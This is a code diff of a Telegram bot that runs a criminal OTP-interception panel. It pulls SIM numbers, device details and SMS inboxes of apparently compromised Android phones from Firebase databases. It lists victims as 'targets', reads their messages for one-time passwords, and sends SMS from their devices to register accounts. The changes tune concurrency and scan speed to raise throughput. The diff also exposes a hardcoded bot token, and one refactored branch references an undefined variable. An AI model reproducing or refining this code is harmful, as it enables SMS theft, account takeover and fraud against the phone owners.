@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Master Vault Memory (No Drop Count) | HTML UI Fixed
-  Anti-Crash Overlap Locks | High Traffic Optimized
+  Instant UI Response (Zero Lag) | Async Locks Fixed
+  Memory Optimized | Ghost Workers Alive
 ══════════════════════════════════════════════════════
 """
 
@@ -48,7 +48,7 @@ PAGE_SIZE       = 20
 TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
 BOT_USERNAME    = "fjjhfbot"
 
-CHUNK_SIZE      = 25    
+CHUNK_SIZE      = 50    # Optimized for speed & memory
 HTTP_CONCURRENCY= 200    
 
 ADMIN_IDS: set[int] = {
@@ -81,18 +81,18 @@ user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
 chats_registry: dict[str, set[int]] = {TOKEN: set()} 
 user_seen_unreg: dict[int, set[str]] = {}
 
-# 🔥 MASTER VAULT (Fixes fluctuating/decreasing numbers!)
 MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
 
 API_LOCK = asyncio.Lock()
-CACHE_LOCK = asyncio.Lock()  # Prevents Overlap Memory Crash
-POLL_LOCK = asyncio.Lock()   # Prevents Flooding
+CACHE_LOCK = asyncio.Lock()  
+POLL_LOCK = asyncio.Lock()   
 WORKER_SEMAPHORE = asyncio.Semaphore(150) 
 PREFETCH_POOL: dict[str, list] = {}
 PREFETCH_TASKS: dict[str, asyncio.Task] = {}
 
-HEAVY_TASK_LIMITER = asyncio.Semaphore(10) 
+# 🔥 LIMITER ONLY FOR HEAVY SCANS (Keeps UI Instant)
+HEAVY_TASK_LIMITER = asyncio.Semaphore(5) 
 
 scan_progress = {
     "scanned": 0,
@@ -271,7 +271,7 @@ def is_spamming(user_id: int) -> bool:
     if user_id in ADMIN_IDS: return False
     now = time.time()
     last_click = user_cooldowns.get(user_id, 0)
-    if now - last_click < 1.0: return True
+    if now - last_click < 0.5: return True  # 🔥 Reduced spam cooldown so users feel it's faster
     user_cooldowns[user_id] = now
     return False
 
@@ -308,6 +308,16 @@ async def fb_get(path: str, base: str, timeout: int = 10) -> Optional[dict]:
             if r.status != 200: return None
             data = await r.json(content_type=None)
             return data if isinstance(data, dict) else {}
+    except: return None
+
+async def fb_keys(path: str, base: str) -> Optional[list[str]]:
+    try:
+        session = await get_http_session()
+        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+            if r.status != 200: return None
+            data = await r.json(content_type=None)
+            return list(data.keys()) if isinstance(data, dict) else []
     except: return None
 
 # ═══════════════════════════════════════════════════════
@@ -401,7 +411,7 @@ def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
         [KeyboardButton("👥 Syndicate (VIP)"), KeyboardButton("📖 Hacker Manual")]
     ]
     if is_admin:
-        keys.append([KeyboardButton("Admin Panel")])
+        keys.append([KeyboardButton("Admin Panel")]) 
     return ReplyKeyboardMarkup(keys, resize_keyboard=True)
 
 def device_label(d: Device) -> str:
@@ -678,13 +688,11 @@ async def _update_global_cache():
         tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        # 🔥 INCREMENTAL VAULT MERGE: Numbers will NEVER drop to 0!
         push_to_master_vault(temp_gathered)
         scan_progress["scanned"] += len(chunk)
         
         temp_gathered.clear()
-        gc.collect() 
-        await asyncio.sleep(0.5) 
+        await asyncio.sleep(0.1) # 🔥 SLEEP REDUCED TO 0.1s FOR BLAZING FAST SCANNING
 
     scan_progress["is_scanning"] = False
 
@@ -826,6 +834,20 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         bot_token = ctx.bot.token
         users_db = all_users
 
+        # 🔥 UI INSTANT RESPONSE: Removes heavy limits from button clicks
+        if data == "home" or data.startswith("pg:") or data == "online":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            pending_action.pop(chat_id, None)
+            devices = await get_all_devices(bot_token, chat_id, users_db)
+            if data == "online":
+                await safe_edit(query, f"🟢 <b>ONLINE TARGETS</b>\n━━━━━━━━━━━━━━━━━━\nLock onto a target:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
+            elif data.startswith("pg:"):
+                page = int(data[3:])
+                await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
+            else:
+                await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
+            return
+
         if data == "cancel_action":
             pending_action.pop(chat_id, None)
             try: await query.message.delete()
@@ -893,111 +915,116 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
 
         if data.startswith("auto_fb:"):
-            service = data.split(":")[1]
-            pending_action[chat_id] = {"action": "auto_checking"}
-            
-            pool = PREFETCH_POOL.setdefault(service, [])
-            seen_set = user_seen_unreg.setdefault(chat_id, set())
-            
-            valid_item = None
-            while pool:
-                item = pool.pop(0)
-                if item["num"] not in seen_set:
-                    valid_item = item
-                    break
-                    
-            if valid_item:
-                final_dev = valid_item["device"]
-                final_res = valid_item["res"]
-                final_num = valid_item["num"]
-                
-                seen_set.add(final_num)
-                await safe_edit(query, f"⚡ <b>GHOST CACHE HIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Injecting payload directly...</i>", parse_mode="HTML")
-                await asyncio.sleep(0.3)
-                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
-                
-                time_diff = int(time.time() - final_dev.last_sms_ts)
-                mins_ago = time_diff // 60
-                secs_ago = time_diff % 60
-                last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
-                
-                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
-                res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
-                
-                kb = [
-                    [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
-                    [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
-                    [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
-                    [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
-                ]
-                return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            if HEAVY_TASK_LIMITER.locked():
+                await safe_edit(query, "⚠️ <b>Server Overloaded!</b>\nToo many simultaneous exploits. Wait 60 seconds.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
+                return
 
-            await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning GLOBAL active nodes (30m ping)...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
-            
-            all_devices = await get_all_devices(bot_token, chat_id, users_db)
-            if chat_id not in pending_action: return 
-            if not all_devices:
-                return await safe_edit(query, "❌ Zero vulnerable nodes found. Add Private Panels or gain VIP Rep.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
-
-            fresh_devices = []
-            for d in all_devices:
-                if d.status == "online" and d.numbers:
-                    is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800)
-                    if is_valid:
-                        d.last_sms_ts = last_ts
-                        fresh_devices.append(d)
-            
-            if chat_id not in pending_action: return 
-            if not fresh_devices: 
-                return await safe_edit(query, "❌ Target network secure. No active nodes found in last 30m.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
-            
-            random.shuffle(fresh_devices)
-            if len(seen_set) > 5000: seen_set.clear() 
-            fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
-            
-            found_unreg, final_res, final_dev, final_num = False, None, None, ""
-            
-            if len(fresh_devices) == 0:
-                return await safe_edit(query, "✅ All active targets exhausted. Wait for network refresh.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
-
-            check_pool = fresh_devices[:100] 
-            
-            await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n✅ Lock on <b>{len(fresh_devices)}</b> Nodes!\n📡 Overloading Top {len(check_pool)} Targets...\n⚡ <i>Injecting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
-            
-            tasks = [check_number_api(service, d.numbers[0]) for d in check_pool]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            if chat_id not in pending_action: return 
-
-            for d, res in zip(check_pool, results):
-                if isinstance(res, dict) and not res.get("status") == "error":
-                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
-                    if not is_reg:
-                        found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
+            async with HEAVY_TASK_LIMITER:
+                service = data.split(":")[1]
+                pending_action[chat_id] = {"action": "auto_checking"}
+                
+                pool = PREFETCH_POOL.setdefault(service, [])
+                seen_set = user_seen_unreg.setdefault(chat_id, set())
+                
+                valid_item = None
+                while pool:
+                    item = pool.pop(0)
+                    if item["num"] not in seen_set:
+                        valid_item = item
                         break
                         
-            if found_unreg:
-                seen_set.add(final_num)
-                await safe_edit(query, f"☠️ <b>ZERO-DAY VULNERABILITY FOUND</b>\n━━━━━━━━━━━━━━━━━━\n🎯 <b>Target Unregistered:</b> <code>+{final_num[-10:]}</code>\n\n💉 <i>Injecting Payload SMS...</i>", parse_mode="HTML")
-                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
+                if valid_item:
+                    final_dev = valid_item["device"]
+                    final_res = valid_item["res"]
+                    final_num = valid_item["num"]
+                    
+                    seen_set.add(final_num)
+                    await safe_edit(query, f"⚡ <b>GHOST CACHE HIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Injecting payload directly...</i>", parse_mode="HTML")
+                    await asyncio.sleep(0.3)
+                    await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
+                    
+                    time_diff = int(time.time() - final_dev.last_sms_ts)
+                    mins_ago = time_diff // 60
+                    secs_ago = time_diff % 60
+                    last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
+                    
+                    res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
+                    res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
+                    
+                    kb = [
+                        [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
+                        [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
+                        [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
+                        [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
+                    ]
+                    return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+
+                await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning GLOBAL active nodes (30m ping)...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
                 
-                time_diff = int(time.time() - final_dev.last_sms_ts)
-                mins_ago = time_diff // 60
-                secs_ago = time_diff % 60
-                last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
+                all_devices = await get_all_devices(bot_token, chat_id, users_db)
+                if chat_id not in pending_action: return 
+                if not all_devices:
+                    return await safe_edit(query, "❌ Zero vulnerable nodes found. Add Private Panels or gain VIP Rep.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
+
+                fresh_devices = []
+                for d in all_devices:
+                    if d.status == "online" and d.numbers:
+                        is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800)
+                        if is_valid:
+                            d.last_sms_ts = last_ts
+                            fresh_devices.append(d)
+            
+                if chat_id not in pending_action: return 
+                if not fresh_devices: 
+                    return await safe_edit(query, "❌ Target network secure. No active nodes found in last 30m.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
                 
-                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
-                res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
+                random.shuffle(fresh_devices)
+                if len(seen_set) > 5000: seen_set.clear() 
+                fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
                 
-                kb = [
-                    [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
-                    [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
-                    [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
-                    [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
-                ]
-                await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
-            else:
-                await safe_edit(query, f"<b>✅ TARGETS SECURE</b>\n\nScanned {len(check_pool)} fresh active numbers. All Registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-Scan Network", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
+                found_unreg, final_res, final_dev, final_num = False, None, None, ""
+                
+                if len(fresh_devices) == 0:
+                    return await safe_edit(query, "✅ All active targets exhausted. Wait for network refresh.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
+
+                check_pool = fresh_devices[:100] 
+                
+                await safe_edit(query, f"⚡ <b>SMART AUTO-EXPLOIT</b>\n━━━━━━━━━━━━━━━━━━\n✅ Lock on <b>{len(fresh_devices)}</b> Nodes!\n📡 Overloading Top {len(check_pool)} Targets...\n⚡ <i>Injecting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort Mission", callback_data="cancel_action")]]), parse_mode="HTML")
+                
+                tasks = [check_number_api(service, d.numbers[0]) for d in check_pool]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                if chat_id not in pending_action: return 
+
+                for d, res in zip(check_pool, results):
+                    if isinstance(res, dict) and not res.get("status") == "error":
+                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                        if not is_reg:
+                            found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
+                            break
+                            
+                if found_unreg:
+                    seen_set.add(final_num)
+                    await safe_edit(query, f"☠️ <b>ZERO-DAY VULNERABILITY FOUND</b>\n━━━━━━━━━━━━━━━━━━\n🎯 <b>Target Unregistered:</b> <code>+{final_num[-10:]}</code>\n\n💉 <i>Injecting Payload SMS...</i>", parse_mode="HTML")
+                    await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
+                    
+                    time_diff = int(time.time() - final_dev.last_sms_ts)
+                    mins_ago = time_diff // 60
+                    secs_ago = time_diff % 60
+                    last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
+                    
+                    res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
+                    res_text += f"\n\n📡 <b>Target Node Stats:</b>\n⏱️ Last Ping: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
+                    
+                    kb = [
+                        [InlineKeyboardButton("📩 Intercept Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
+                        [InlineKeyboardButton("🔍 Deep Search Target", callback_data=f"search_num:{final_num[-10:]}")],
+                        [InlineKeyboardButton("🔄 Exploit Another Target", callback_data=data)],
+                        [InlineKeyboardButton("💻 Main Terminal", callback_data="home")]
+                    ]
+                    await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+                else:
+                    await safe_edit(query, f"<b>✅ TARGETS SECURE</b>\n\nScanned {len(check_pool)} fresh active numbers. All Registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-Scan Network", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
             return
 
         if data.startswith("search_num:"):
@@ -1078,26 +1105,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data == "admin_refresh":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
-            return
-
-        if data == "home":
-            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-            pending_action.pop(chat_id, None)
-            devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
-            return
-
-        if data.startswith("pg:"):
-            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-            page = int(data[3:])
-            devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")
-            return
-
-        if data == "online":
-            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-            devices = await get_all_devices(bot_token, chat_id, users_db)
-            await safe_edit(query, f"🟢 <b>ONLINE TARGETS</b>\n━━━━━━━━━━━━━━━━━━\nLock onto a target:", reply_markup=online_only_keyboard(devices), parse_mode="HTML")
             return
 
         if data.startswith("cp:"):
@@ -1251,6 +1258,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await update.message.reply_text("☠️ <b>SUPER ADMIN CONSOLE</b>\nChoose override parameter:", reply_markup=kb, parse_mode="HTML")
             return
 
+        # 🔥 INSTANT UI FETCH (Zero Locks on simple clicks)
         if text == "📱 Devices List":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
@@ -1409,10 +1417,7 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("No active process.")
             return
 
-        state = pending_action.get(chat_id)
-        if not state: return
-
-        action = state.get("action")
+        if not action: return
         
         if action == "search_live_number":
             pending_action.pop(chat_id)
@@ -1522,12 +1527,20 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     except: pass
 
 # ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS
+#  FIREBASE DATA FETCHERS  (MASTER VAULT SYSTEM)
 # ═══════════════════════════════════════════════════════
 
-async def fetch_db_data_task(tag: str, url: str, results_list: list):
+def push_to_master_vault(temp_devices):
+    for d in temp_devices:
+        if d.numbers:  
+            MASTER_DEVICE_DICT[d.id] = d
+    
+    dev_list = list(MASTER_DEVICE_DICT.values())
+    dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
+    GLOBAL_DEVICE_CACHE["ALL"] = dev_list
+
+async def fetch_device_data_task(tag: str, url: str, temp_list: list):
     try:
-        devices_list = []
         added_set = set()
         root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
             fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
@@ -1543,7 +1556,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if not nums: continue 
                 added_set.add(dev_id)
                 model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if user_data_all and isinstance(user_data_all, dict):
             for dev_id, data in user_data_all.items():
@@ -1552,7 +1565,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 nums = extract_all_nums(data)
                 if not nums: continue 
                 added_set.add(dev_id)
-                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if clients_all and isinstance(clients_all, dict):
             for dev_id, client in clients_all.items():
@@ -1565,10 +1578,7 @@ async def fetch_db_data_task(tag: str, url: str, results_list: list):
                 if not nums and not client.get("modelName"): continue
                 added_set.add(dev_id)
                 model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
-                
-        if devices_list:
-            results_list.extend(devices_list)
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
     except: pass
 
 async def _update_global_cache():
@@ -1578,13 +1588,11 @@ async def _update_global_cache():
         dbs_to_poll[f"G_{i}"] = g_url
             
     for uid, uinfo in all_users.items():
-        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS:
-            pass 
+        if uinfo.get("vip_until", 0) > time.time() or uid in ADMIN_IDS: pass 
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
     items = list(dbs_to_poll.items())
-    
     scan_progress["total"] = len(items)
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
@@ -1595,21 +1603,12 @@ async def _update_global_cache():
         tasks = [fetch_device_data_task(tag, url, temp_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        # 🔥 MERGE DIRECTLY TO MASTER VAULT: Numbers will never drop!
-        for d in temp_gathered:
-            if d.numbers:
-                MASTER_DEVICE_DICT[d.id] = d
-                
-        # Generate clean list for cache
-        unique_devices = list(MASTER_DEVICE_DICT.values())
-        unique_devices.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
-        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
-        
+        push_to_master_vault(temp_gathered)
         scan_progress["scanned"] += len(chunk)
-        temp_gathered.clear()
-        gc.collect() 
-        await asyncio.sleep(0.5) 
         
+        temp_gathered.clear()
+        await asyncio.sleep(0.1) 
+
     scan_progress["is_scanning"] = False
 
 async def global_cache_loop():
@@ -1620,40 +1619,61 @@ async def global_cache_loop():
                 except: pass
         await asyncio.sleep(120) 
 
-async def _forward_sms(device: Device, sms: dict) -> None:
-    global total_otps_processed
-    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
-    if not body: return
-
-    total_otps_processed += 1
-    label = device_label(device)
-    otp   = extract_otp(body)
-    msg_text = auto_forward_msg(sms, label)
+async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
+    if users_db is None: users_db = {}
+    uinfo = users_db.get(chat_id, {})
+    is_vip = uinfo.get("vip_until", 0) > time.time()
+    is_admin = chat_id in ADMIN_IDS
+    custom_dbs = get_user_dbs(uinfo)
     
-    master_log_sms(", ".join(device.numbers) if device.numbers else device.id[:8], body, otp)
-    
-    kb_rows = []
-    if otp: kb_rows.append([InlineKeyboardButton(f"Copy OTP: {otp}", callback_data=f"cp:{otp}")])
-    kb_rows.append([
-        InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{device.id}"),
-        InlineKeyboardButton("Device Info",  callback_data=f"info:{device.id}"),
-    ])
-    markup = InlineKeyboardMarkup(kb_rows)
+    if not custom_dbs and (is_vip or is_admin):
+        return GLOBAL_DEVICE_CACHE.get("ALL", [])
 
-    send_tasks = []
-    for bot_token, chat_dict in list(user_focus.items()):
-        app_to_use = _main_app
-        if not app_to_use: continue
-
-        focused_chats = [cid for cid, did in chat_dict.items() if did == device.id]
-        for chat_id in set(focused_chats):
-            if otp: 
-                all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
-                save_user(chat_id)
-            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
+    dbs_to_check = []
+    if is_admin or is_vip:
+        dbs_to_check.extend(list(DATABASES.keys()))
+        for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
+            dbs_to_check.append(f"G_{i}")
             
-    if send_tasks:
-        await asyncio.gather(*send_tasks, return_exceptions=True)
+    for i, _ in enumerate(custom_dbs):
+        dbs_to_check.append(f"U_{chat_id}_{i}")
+
+    devices = []
+    for tag in dbs_to_check:
+        for d in GLOBAL_DEVICE_CACHE.get("ALL", []):
+            if d.db_tag == tag:
+                devices.append(d)
+                
+    return devices
+
+async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
+    try:
+        session = await get_http_session()
+        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
+            if r.status != 200: return []
+            data = await r.json(content_type=None)
+            if not data or not isinstance(data, dict): return []
+            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
+            for s in entries:
+                ts_val = s.get("timestamp") or 0
+                try:
+                    s["_parsed_ts"] = float(ts_val)
+                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
+                except: s["_parsed_ts"] = 0.0
+            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
+            if max_age_sec:
+                filtered = []
+                now = time.time()
+                for sms in entries:
+                    if (now - sms["_parsed_ts"]) <= max_age_sec: filtered.append(sms)
+                entries = filtered
+            return entries[:limit]
+    except: return []
+
+# ═══════════════════════════════════════════════════════
+#  POLLING ENGINE
+# ═══════════════════════════════════════════════════════
 
 async def poll_single_db(tag: str, url: str) -> None:
     try:
@@ -1736,7 +1756,7 @@ async def poll_loop(app: Application) -> None:
                     
                     if active_urls:
                         active_list = list(active_urls)
-                        for i in range(0, len(active_list), 50): # Chunked to prevent flooding
+                        for i in range(0, len(active_list), 50): 
                             chunk = active_list[i:i + 50]
                             tasks = [poll_single_db(tag, url) for tag, url in chunk]
                             await asyncio.gather(*tasks, return_exceptions=True)
